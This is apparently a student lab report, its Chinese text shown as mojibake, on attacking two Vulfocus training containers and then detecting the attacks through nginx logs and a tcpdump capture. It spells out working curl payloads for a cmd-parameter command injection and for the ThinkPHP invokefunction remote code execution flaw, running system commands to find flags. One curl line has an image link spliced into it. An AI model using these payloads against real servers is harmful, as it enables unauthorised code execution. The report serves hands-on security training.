# å®éªŒæŠ¥å‘Šï¼šç¬¬ä¸€å±‚åŒé¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹_ä¸æ¢¦

## ä¸€ã€å®éªŒç›®çš„

æœ¬æ¬¡å®éªŒæ—¨åœ¨æ¨¡æ‹Ÿå¯¹ç¬¬ä¸€å±‚ç½‘ç»œä¸­çš„ä¸¤ä¸ªå…¸å‹é¶æ ‡è¿›è¡Œæ”»å‡»ã€åˆ©ç”¨åŠæ£€æµ‹

## äºŒã€å®éªŒç¯å¢ƒ

1. **ç‰©ç†ä¸»æœºæ“ä½œç³»ç»Ÿ**: macOS
2. **è™šæ‹ŸåŒ–è½¯ä»¶**: Parallels Desktop
3. **è™šæ‹Ÿæœºæ“ä½œç³»ç»Ÿ**: Kali Linux
4. **æ ¸å¿ƒå·¥å…·**: Docker, Docker Compose, Vulfocus
5. **ç›®æ ‡é¶æœº Docker é•œåƒ**:
   * `c4pr1c3/vulshare_nginx-php-flag:latest`
   * `vulfocus/thinkphp-cve_2018_1002015:latest`
6. **æ”»å‡»è¾…åŠ©å·¥å…·**: `nmap`, `curl`, Web æµè§ˆå™¨, `Burp Suite`, `tcpdump`

## ä¸‰ã€å®éªŒæ­¥éª¤

### ï¼ˆä¸€ï¼‰åŸºç¡€ç¯å¢ƒæ­å»º:æ‹‰å–ç›®æ ‡ Docker é•œåƒ

å®éªŒæ‰€éœ€çš„é¶æœºé•œåƒæ˜¯ `c4pr1c3/vulshare_nginx-php-flag:latest` å’Œ `vulfocus/thinkphp-cve_2018_1002015:latest`ã€‚
æ‚¨å¯ä»¥åœ¨ Vulfocus å¹³å°çš„ "é•œåƒç®¡ç†" -> "å…¬å…±é•œåƒ" ä¸­æœç´¢å¹¶ä¸‹è½½è¿™äº›é•œåƒï¼Œæˆ–è€…ç›´æ¥åœ¨ Kali ç»ˆç«¯ä¸­ä½¿ç”¨ Docker å‘½ä»¤æ‹‰å–ï¼š

```bash
docker pull c4pr1c3/vulshare_nginx-php-flag:latest
docker pull vulfocus/thinkphp-cve_2018_1002015:latest
```

### ï¼ˆäºŒï¼‰ç¬¬ä¸€å±‚é¶æ ‡ä¸€ï¼š`vulshare_nginx-php-flag:latest` æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹

#### 1. å¯åŠ¨é¶æœºç¯å¢ƒ

åœ¨ Vulfocus å¹³å°ä¸­ï¼Œæ‰¾åˆ° `vulshare_nginx-php-flag:latest` é•œåƒï¼Œç‚¹å‡» "å¯åŠ¨"æŒ‰é’®ã€‚Vulfocus ä¼šä¸ºè¯¥å®¹å™¨åˆ†é…ä¸€ä¸ª IP åœ°å€å’Œç«¯å£

å¯åŠ¨é¶æœº
![1748016291402](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748016291402.png)

#### 2. ä¿¡æ¯æ”¶é›†

é¶æœºçš„è®¿é—®åœ°å€ä¸º `http://10.37.133.3:8630/`ã€‚

ä½¿ç”¨ `nmap` å¯¹é¶æœºIP `10.37.133.3` å’Œç«¯å£ `8630` è¿›è¡ŒåŸºç¡€çš„ç«¯å£æ‰«æï¼Œäº†è§£å…¶å¼€æ”¾çš„æœåŠ¡ï¼š

```bash
nmap -sV -p 8630 10.37.133.3
```

![1748016549013](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748016549013.png)

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ nmap -sV -p 8630 10.37.133.3

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-23 12:08 EDT
Nmap scan report for kali-linux.host-only--3 (10.37.133.3)
Host is up.

PORT     STATE    SERVICE VERSION
8630/tcp filtered unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.22 seconds
```

é€šè¿‡æµè§ˆå™¨è®¿é—®é¶æœºæä¾›çš„ Web æœåŠ¡ `http://10.37.133.3:8630/`ã€‚

è®¿é—®ç½‘ç«™é¡µé¢å¦‚ä¸‹ï¼š
![1748016340512](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748016340512.png)

é¡µé¢ä¸Šç›´æ¥ç»™å‡ºäº†å…³é”®æç¤ºä¿¡æ¯ï¼š`index.php?cmd=ls /tmp`ã€‚è¿™å¼ºçƒˆæš—ç¤ºäº†å­˜åœ¨ä¸€ä¸ªé€šè¿‡ `index.php` çš„ `cmd` GETå‚æ•°æ‰§è¡Œä»»æ„å‘½ä»¤çš„æ¼æ´ã€‚

#### 3. æ¼æ´åˆ†æä¸åˆ©ç”¨

é¶æ ‡åç§° `vulshare_nginx-php-flag` å’Œé¡µé¢æç¤º `index.php?cmd=ls /tmp` æ˜ç¡®æŒ‡å‡ºäº†è¿™æ˜¯ä¸€ä¸ªåŸºäº Nginx å’Œ PHP çš„åº”ç”¨ï¼Œå¹¶ä¸”å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œç›®æ ‡æ˜¯æ‰¾åˆ°ä¸€ä¸ª "flag"ã€‚

**åˆ©ç”¨æ–¹å¼ï¼šé€šè¿‡ `cmd` GET å‚æ•°æ‰§è¡Œå‘½ä»¤**
é¡µé¢æç¤ºå·²ç»ç»™å‡ºäº†åˆ©ç”¨æ–¹æ³•ï¼š`index.php` æ–‡ä»¶æ¥å—ä¸€ä¸ªåä¸º `cmd` çš„ GET å‚æ•°ï¼Œå…¶å€¼ä¼šè¢«æœåŠ¡å™¨æ‰§è¡Œã€‚

* **éªŒè¯åˆæ­¥å‘½ä»¤æ‰§è¡Œ**ï¼š
  æ ¹æ®é¡µé¢æç¤ºï¼Œç›´æ¥è®¿é—® `http://10.37.133.3:8630/index.php?cmd=ls%20/tmp` (æ³¨æ„ URL ç¼–ç ç©ºæ ¼ä¸º `%20`)ã€‚

  ```bash
  curl "http://10.37.133.3:8630/index.php?cmd=ls%20/tmp"
  ```

  è§‚å¯Ÿè¿”å›ç»“æœï¼Œç¡®è®¤ `/tmp` ç›®å½•ä¸‹çš„å†…å®¹

  è¿”å›ç»“æœä¸º:

  ```
  index.php?cmd=ls /tmpflag-{bmha755c46b-7381-4beb-9495-c15d83956d7e}
  ```

  ![1748016675838](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748016675838.png)

  é€šè¿‡æ‰§è¡Œ `ls /tmp` å‘½ä»¤,æˆ‘ä»¬ç›´æ¥è·å¾—äº†flag: `flag-{bmha755c46b-7381-4beb-9495-c15d83956d7e}`

  ![1748019835789](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748019835789.png)
* **æ¼æ´éªŒè¯è¡¥å……**ï¼š
  è™½ç„¶æˆ‘ä»¬å·²ç»è·å¾—äº†flag,ä½†ä¸ºäº†å®Œæ•´éªŒè¯è¯¥æ¼æ´çš„åˆ©ç”¨é¢,æˆ‘ä»¬å¯ä»¥å°è¯•æ‰§è¡Œå…¶ä»–ç³»ç»Ÿå‘½ä»¤:

  ```bash
  # ç¡®å®šå½“å‰ç”¨æˆ·å’Œæƒé™
  curl "http://10.37.133.3:8630/index.php?cmd=id"
  ```

  è¿”å›ç»“æœæ˜¾ç¤ºä¸º www-data ç”¨æˆ·:

  ```
  index.php?cmd=ls /tmpuid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```

  ![1748017681838](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748017681838.png)

  ```bash
  # æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯
  curl "http://10.37.133.3:8630/index.php?cmd=uname%20-a"
  ```

  è¿”å›ç»“æœæ˜¾ç¤ºç³»ç»Ÿä¿¡æ¯:

  ```
  index.php?cmd=ls /tmpLinux c93755678f6c 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64 GNU/Linux
  ```

  ![1748017785746](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748017785746.png)

  ```bash
  # æŸ¥çœ‹å½“å‰ç›®å½•ç»“æ„
  curl "http://10.37.133.3:8630/index.php?cmd=ls%20-la%20/"
  ```

  è¿”å›ç»“æœæ˜¾ç¤ºæ ¹ç›®å½•ç»“æ„:

  ![1748017797697](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748017797697.png)

#### 4. å¨èƒæ£€æµ‹

##### 4.1æŸ¥çœ‹ Nginx è®¿é—®æ—¥å¿—:

é¦–å…ˆï¼Œéœ€è¦ç¡®å®š `vulshare_nginx-php-flag` å®¹å™¨çš„ ID æˆ–åç§°ï¼š

```bash
docker ps
```

ç›®æ ‡å®¹å™¨çš„ ID ä¸º `c93755678f6c`ã€‚
è¿›å…¥å®¹å™¨å†…éƒ¨ï¼š

```bash
docker exec -it c93755678f6c /bin/bash
```

Nginx çš„è®¿é—®æ—¥å¿—é€šå¸¸ä½äº `/var/log/nginx/access.log`ã€‚
æŸ¥çœ‹å¹¶ç­›é€‰å¯ç–‘è¯·æ±‚ï¼š

```bash
# å®æ—¶æŸ¥çœ‹æ—¥å¿— (éƒ¨åˆ†å†…å®¹)
tail -f /var/log/nginx/access.log
```

![1748017954540](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748017954540.png)

```bash
# ç­›é€‰åŒ…å«å‘½ä»¤æ‰§è¡Œçš„è¯·æ±‚
cat /var/log/nginx/access.log | grep "index.php?cmd="
```

åœ¨æ—¥å¿—ä¸­å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¹‹å‰æ‰§è¡Œçš„å‘½ä»¤,ä¾‹å¦‚:

```
10.37.133.3 - - [23/May/2025:16:10:43 +0000] "GET /index.php?cmd=ls%20/tmp HTTP/1.1" 200 79 "-" "curl/8.11.0"
10.37.133.3 - - [23/May/2025:16:27:50 +0000] "GET /index.php?cmd=id HTTP/1.1" 200 86 "-" "curl/8.11.0"
10.37.133.3 - - [23/May/2025:16:29:31 +0000] "GET /index.php?cmd=uname%20-a HTTP/1.1" 200 134 "-" "curl/8.11.0"
10.37.133.3 - - [23/May/2025:16:29:50 +0000] "GET /index.php?cmd=ls%20-la%20/ HTTP/1.1" 200 1137 "-" "curl/8.11.0"
```

##### 4.2ç½‘ç»œæµé‡æ•è· :

  ç”±äºæˆ‘ä»¬çš„æ”»å‡»æœºåŒæ—¶ä¹Ÿæ˜¯ Docker å®¹å™¨çš„å®¿ä¸»æœºï¼Œå½“ä» Kali è®¿é—®æ˜ å°„åˆ°æœ¬åœ° IP (`10.37.133.3:8630`) çš„å®¹å™¨æœåŠ¡æ—¶ï¼Œæµé‡å®é™…ä¸Šæ˜¯åœ¨ Docker çš„å†…éƒ¨ç½‘ç»œä¸­æµåŠ¨çš„ã€‚æˆ‘ä»¬éœ€è¦ç›‘å¬ Docker çš„ç½‘æ¡¥æ¥å£ï¼ˆé€šå¸¸æ˜¯ `docker0`ï¼‰ä»¥åŠå®¹å™¨åœ¨è¯¥ç½‘ç»œä¸­çš„å†…éƒ¨ IP å’Œå®é™…æœåŠ¡ç«¯å£ï¼ˆæœ¬å®éªŒä¸­æ˜¯ `172.17.0.2` çš„ `80` ç«¯å£ï¼‰ã€‚

1. **ç¡®å®šå®¹å™¨å†…éƒ¨ IP å’Œç½‘ç»œæ¥å£**:
   é¦–å…ˆï¼Œé€šè¿‡ `docker ps` è·å–å®¹å™¨ ID (æœ¬ä¾‹ä¸­ä¸º `c93755678f6c`)ã€‚
   ç„¶åï¼Œä½¿ç”¨ `docker inspect <container_id>` æŸ¥çœ‹å®¹å™¨ç½‘ç»œè¯¦æƒ…ï¼Œæ‰¾åˆ°å…¶åœ¨ `bridge` ç½‘ç»œï¼ˆé€šå¸¸å¯¹åº” `docker0` æ¥å£ï¼‰ä¸‹çš„ `IPAddress` (æœ¬ä¾‹ä¸­ä¸º `172.17.0.2`)ã€‚

   ```
   docker inspect c93755678f6c
   ```

![1748019175085](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748019175085.png)

2. **æ‰§è¡Œ `tcpdump` å‘½ä»¤**:
   åœ¨ Kali ä¸»æœºä¸Šï¼Œæ‰“å¼€ä¸€ä¸ªç»ˆç«¯çª—å£ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œç›‘å¬ `docker0` æ¥å£ä¸Šä¸å®¹å™¨ `172.17.0.2` çš„ `80` ç«¯å£ç›¸å…³çš„æµé‡ï¼š

```bash
sudo tcpdump -i docker0 -A 'host 172.17.0.2 and port 80' -w nginx_php_flag_traffic.pcap  
```

    ![1748019251492](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748019251492.png)

3. **äº§ç”Ÿæµé‡**:
   åœ¨å¦ä¸€ä¸ªç»ˆç«¯çª—å£æ‰§è¡Œè®¿é—®é¶æœºçš„å‘½ä»¤:

   ```bash
   curl "http://10.37.133.3:8630/index.php?cmd=ls%20/tmp"  
   ```

   ![1748019262540](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748019262540.png)
4. **åœæ­¢æŠ“åŒ…å¹¶åˆ†æ**:

   å®Œæˆ `curl` å‘½ä»¤åï¼Œå›åˆ° `tcpdump` ç»ˆç«¯æŒ‰ `Ctrl+C` åœæ­¢æŠ“åŒ…ã€‚
   æ­¤æ—¶ï¼Œ`nginx_php_flag_traffic.pcap` æ–‡ä»¶ä¸­åº”åŒ…å«æ•è·åˆ°çš„æ•°æ®åŒ…ã€‚å¯ä»¥ä½¿ç”¨ Wireshark æ‰“å¼€è¯¥æ–‡ä»¶è¿›è¡Œè¯¦ç»†åˆ†æï¼Œå¯ä»¥æ¸…æ™°çœ‹åˆ° HTTP GET è¯·æ±‚ä¸­çš„å‘½ä»¤æ‰§è¡Œå‚æ•°

   ![1748019616647](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748019616647.png)

   é€šè¿‡ Wireshark æ‰“å¼€ nginx_php_flag_traffic.pcap æ–‡ä»¶åï¼Œå¯ä»¥æ¸…æ™°åœ°è¿½è¸ªåˆ°æ”»å‡»æµç¨‹ï¼š
5. è§‚å¯Ÿåˆ°ä»æ”»å‡»æœºIP (10.37.133.3) åˆ°å®¹å™¨å†…éƒ¨IP (172.17.0.2) çš„TCPä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹ï¼Œå»ºç«‹äº†ç«¯å£ 80 ä¸Šçš„è¿æ¥
6. æ•è·åˆ°ä¸€ä¸ªæºè‡ª 10.37.133.3ã€ç›®æ ‡ä¸º 172.17.0.2 çš„HTTP GETè¯·æ±‚ã€‚è¯¥è¯·æ±‚çš„è¯¦ç»†ä¿¡æ¯æ˜¾ç¤ºå…¶è¯·æ±‚è·¯å¾„ä¸º /index.php?cmd=ls%20/tmpï¼Œè¿™ä¸æˆ‘ä»¬é€šè¿‡ curl å‘é€çš„å‘½ä»¤æ³¨å…¥payloadå®Œå…¨ä¸€è‡´
   ![1748019792810](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748019792810.png)
7. è§‚å¯Ÿåˆ°ä»å®¹å™¨ (172.17.0.2) è¿”å›ç»™æ”»å‡»æœº (10.37.133.3) çš„ HTTP/1.1 200 OK å“åº”ï¼Œè¡¨æ˜æœåŠ¡å™¨æˆåŠŸå¤„ç†äº†è¯¥è¯·æ±‚

è¿™äº›æ•è·åˆ°çš„æ•°æ®åŒ…æœ‰åŠ›åœ°è¯æ˜äº†æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„HTTP GETè¯·æ±‚å°† ls /tmp å‘½ä»¤ä¼ é€’ç»™äº†ç›®æ ‡æœåŠ¡å™¨ï¼Œå¹¶æˆåŠŸæ‰§è¡Œã€‚

### ï¼ˆä¸‰ï¼‰ç¬¬ä¸€å±‚é¶æ ‡äºŒï¼š`vulfocus/thinkphp-cve_2018_1002015:latest` æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹

#### 1. å¯åŠ¨é¶æœºç¯å¢ƒ

åœ¨ Vulfocus å¹³å°ä¸­ï¼Œæ‰¾åˆ° `vulfocus/thinkphp-cve_2018_1002015:latest` é•œåƒï¼Œç‚¹å‡» "å¯åŠ¨"ã€‚
æ ¹æ®ç”¨æˆ·æä¾›çš„æˆªå›¾ï¼Œé¶æœºæˆåŠŸå¯åŠ¨ï¼ŒVulfocus åˆ†é…çš„è®¿é—®åœ°å€ä¸º `10.37.133.3:39365`ã€‚

![1748019861063](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748019861063.png)

#### 2. ä¿¡æ¯æ”¶é›†

é€šè¿‡æµè§ˆå™¨è®¿é—®é¶æœº `http://10.37.133.3:39365`ã€‚
![1748019898037](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748019898037.png)

é¡µé¢æ˜¾ç¤º: "Welcome BMH shooting range"ã€‚è¿™ä¸ªä¿¡æ¯æ¯”è¾ƒé€šç”¨ï¼Œæ²¡æœ‰ç›´æ¥æš´éœ² ThinkPHP ç‰ˆæœ¬å·ã€‚
`CVE-2018-1002015` è¿™ä¸ª CVE ID å¹¶éå¹¿ä¸ºäººçŸ¥çš„ ThinkPHP æ ‡å‡† CVE ç¼–å·ã€‚ä½† `vulfocus/thinkphp-cve_2018_1002015` è¿™ä¸ªé•œåƒåç§°æš—ç¤ºå®ƒä¸ 2018 å¹´å·¦å³çš„ ThinkPHP æ¼æ´ç›¸å…³ã€‚è¿™é€šå¸¸æŒ‡å‘ ThinkPHP 5.x ç³»åˆ—çš„è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE) æ¼æ´ï¼Œä¾‹å¦‚è‘—åçš„ CVE-2018-20062ã€‚æˆ‘ä»¬å°†åŸºäºè¿™ç±»æ¼æ´è¿›è¡Œå°è¯•ã€‚

#### 3. æ¼æ´åˆ†æä¸åˆ©ç”¨

æ­¤æ¼æ´æºäº ThinkPHP æ¡†æ¶å¯¹æ§åˆ¶å™¨åç§°çš„è§£æå­˜åœ¨ç¼ºé™·ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹å®šçš„ URL æ¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•ï¼Œä»è€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é‡è¦æç¤ºï¼š** åœ¨ä½¿ç”¨ `curl` æ‰§è¡Œä»¥ä¸‹ Payload æ—¶ï¼Œå¦‚æœ URL ä¸­åŒ…å«æ–¹æ‹¬å· `[` å’Œ `]` (ä¾‹å¦‚ `vars[0]` æˆ– `vars[1][]`)ï¼Œç›´æ¥ä½¿ç”¨å¯èƒ½ä¼šå¯¼è‡´ `curl: (3) bad range in URL` é”™è¯¯ã€‚è¿™æ˜¯å› ä¸ºæ–¹æ‹¬å·åœ¨ URL ä¸­æ˜¯ç‰¹æ®Šå­—ç¬¦ï¼Œéœ€è¦è¿›è¡Œç™¾åˆ†å·ç¼–ç ã€‚`[` åº”ç¼–ç ä¸º `%5B`ï¼Œ`]` åº”ç¼–ç ä¸º `%5D`ã€‚å»ºè®®å°†æ•´ä¸ª URL ç”¨å•å¼•å· `'` åŒ…è£¹ï¼Œä»¥é¿å… shell å¯¹ç‰¹æ®Šå­—ç¬¦ (å¦‚ `&`, `\`) çš„é¢å¤–è½¬ä¹‰ã€‚

* **Payload 1: æ‰§è¡Œ `phpinfo()` (éªŒè¯æ¼æ´å­˜åœ¨æ€§)**
  æ„é€ å¦‚ä¸‹ URL (å·²è¿›è¡Œæ–¹æ‹¬å·ç¼–ç )ï¼š
  `http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1`
  ä½¿ç”¨ `curl` æˆ–æµè§ˆå™¨è®¿é—®ï¼š

  ```bash
  curl 'http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1'
  ```

  ![1748020421170](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748020421170.png)
  å¦‚å›¾,å“åº”ä¸­åŒ…å« PHP çš„é…ç½®ä¿¡æ¯ï¼ˆ`phpinfo()` çš„è¾“å‡ºï¼‰ï¼Œåˆ™è¡¨æ˜æ¼æ´å­˜åœ¨ä¸”å¯åˆ©ç”¨ã€‚
* **Payload 2: æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ (ä¾‹å¦‚ `id`)**
  æ„é€  URL ä»¥æ‰§è¡Œ `id` å‘½ä»¤ (å·²è¿›è¡Œæ–¹æ‹¬å·ç¼–ç )ï¼š
  `http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=id`
  ä½¿ç”¨ `curl` æ‰§è¡Œï¼š

  ```bash
  curl 'http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=id'
  ```

  å¦‚å›¾,å“åº”ä¸­åŒ…å«ç±»ä¼¼ `uid=0(root) gid=0(root) groups=0(root)` çš„è¾“å‡ºï¼Œè¡¨ç¤ºå‘½ä»¤æˆåŠŸæ‰§è¡Œ
  ![1748020916102](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748020916102.png)
* **Payload 3: è·å– Flag**
  å‡è®¾ flag æ–‡ä»¶ä½äº `/flag.txt` æˆ– `/flag`ã€‚
  æ„é€  URL (å·²è¿›è¡Œæ–¹æ‹¬å·ç¼–ç ) å°è¯•è¯»å– `/flag.txt`ï¼š
  `http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cat%20/flag.txt`
  æˆ–è€…å°è¯•è¯»å– `/flag`ï¼š
  `http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cat%20/flag`
  ä½¿ç”¨ `curl` è·å–ï¼š

  ```bash
  # å°è¯•è¯»å– /flag.txt
  curl 'http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cat%20/flag.txt'
  # æˆ–è€…å°è¯•è¯»å– /flag
  curl 'http://10.37.133.3:![1748067441252](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748067441252.png)39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cat%20/flag'
  ```

  ![1748021243075](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748021243075.png)

  å°è¯• cat /flag.txt å’Œ cat /flag éƒ½æ²¡æœ‰è¿”å›ä»»ä½•è¾“å‡ºï¼Œè¿™æ„å‘³ç€ flag æ–‡ä»¶å¯èƒ½ä¸åœ¨è¿™äº›é¢„æœŸçš„è·¯å¾„ä¸‹ï¼Œæˆ–è€…æ–‡ä»¶åä¸åŒï¼Œæˆ–è€…æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤çš„ç”¨æˆ·ï¼ˆé€šè¿‡ id å‘½ä»¤å¯ä»¥çœ‹åˆ°ï¼Œé€šå¸¸æ˜¯ www-data æˆ–ç±»ä¼¼æƒé™è¾ƒä½çš„ç”¨æˆ·ï¼‰æ²¡æœ‰æƒé™è¯»å–è¿™äº›æ–‡ä»¶ã€‚

1. å°è¯•åˆ—å‡ºæ ¹ç›®å½•æ–‡ä»¶å’Œç›®å½•ï¼š

```bash
    curl 'http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=ls%20-la%20/'
```

![1748021233259](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748021233259.png)

è¿™é‡Œç›´æ¥çœ‹å¹¶æ²¡æœ‰æ˜æ˜¾å«åš "flag" æˆ–ç±»ä¼¼çš„æ–‡ä»¶ã€‚app å’Œ var ç›®å½•æ˜¯å¸¸è§çš„Webåº”ç”¨ç›¸å…³ç›®å½•ï¼Œä½†æ ¹ç›®å½•ä¸‹æ²¡æœ‰ç›´æ¥çš„ flag æ–‡ä»¶

2. æœç´¢åä¸º "flag" (ä¸åŒºåˆ†å¤§å°å†™) çš„æ–‡ä»¶ï¼š
   æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ find å‘½ä»¤åœ¨æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­æœç´¢åŒ…å« "flag" å­—ç¬¦ä¸²çš„æ–‡ä»¶åã€‚è¿™å¯èƒ½ä¼šäº§ç”Ÿå¾ˆå¤šè¾“å‡ºï¼Œä½† flag å¯èƒ½å°±åœ¨å…¶ä¸­ã€‚
   find / -name '*flag*' (æœç´¢æ–‡ä»¶åä¸­åŒ…å« "flag" çš„æ–‡ä»¶ï¼Œä¸åŒºåˆ†å¤§å°å†™å¯ä»¥ä½¿ç”¨ -iname)
   è€ƒè™‘åˆ°è¾“å‡ºå¯èƒ½å¾ˆé•¿ï¼Œç›´æ¥åœ¨ curl ä¸­æ˜¾ç¤ºå¯èƒ½ä¸æ–¹ä¾¿ï¼Œä½†æˆ‘ä»¬å¯ä»¥å…ˆå°è¯•ã€‚
   éœ€è¦å¯¹ find å‘½ä»¤ä¸­çš„ / å’Œ * è¿›è¡Œ URL ç¼–ç ï¼š/ ç¼–ç ä¸º %2Fï¼Œ* ç¼–ç ä¸º %2Aã€‚

```bash
    curl 'http://10.37.133.3:39365/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=find%20%2F%20-name%20%27%2Aflag%2A%27'
```

![1748021332621](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748021332621.png)

find å‘½ä»¤æˆåŠŸæ‰§è¡Œ,æ‰¾åˆ°äº†flag!

 `flag-{bmh8b59ed0c-3042-499e-9a2d-ef93c0e1ec87}`

 ![1748023336097](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748023336097.png)

#### 4. å¨èƒæ£€æµ‹

##### 4.1 æŸ¥çœ‹ Web æœåŠ¡å™¨è®¿é—®æ—¥å¿—:

  é¦–å…ˆç¡®å®š `thinkphp-cve_2018_1002015` å®¹å™¨çš„ ID æˆ–åç§°ï¼š

```bash
  docker ps
```

![1748021570040](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748021570040.png)

  å¾—åˆ°å®¹å™¨ID ä¸º `c097683c73a4`ã€‚
  è¿›å…¥å®¹å™¨å†…éƒ¨ï¼š

```bash
  docker exec -it c097683c73a4 /bin/bash
```

![1748021853513](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748021853513.png)
è¿™ä¸ªé”™è¯¯ OCI runtime exec failed: exec failed: unable to start container process: exec: "/bin/bash": stat /bin/bash: no such file or directory: unknown è¡¨æ˜åœ¨å®¹å™¨ c097683c73a4 å†…éƒ¨ï¼Œ/bin/bash è¿™ä¸ªè·¯å¾„æ˜¯æ— æ•ˆçš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¯¥å®¹å™¨ä¸­æ²¡æœ‰å®‰è£… bash shellï¼Œæˆ–è€…å®ƒä¸åœ¨ /bin/bash è¿™ä¸ªä½ç½®ã€‚

è¿™é€šå¸¸å‘ç”Ÿåœ¨ä¸€äº›æç®€çš„ Docker é•œåƒä¸­ï¼Œå®ƒä»¬ä¸ºäº†å‡å°ä½“ç§¯å¯èƒ½åªåŒ…å«äº†æœ€åŸºç¡€çš„ shellï¼Œå¦‚ /bin/sh (Bourne Shell)ï¼Œæˆ–è€…ç”šè‡³æ²¡æœ‰ä¸€ä¸ªæ ‡å‡†çš„äº¤äº’å¼ shellã€‚

è§£å†³æ–¹æ¡ˆï¼šå°è¯•ä½¿ç”¨ /bin/sh

```bash
  docker exec -it c097683c73a4 /bin/sh
```

![1748021885646](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748021885646.png)
æˆåŠŸè¿›å…¥

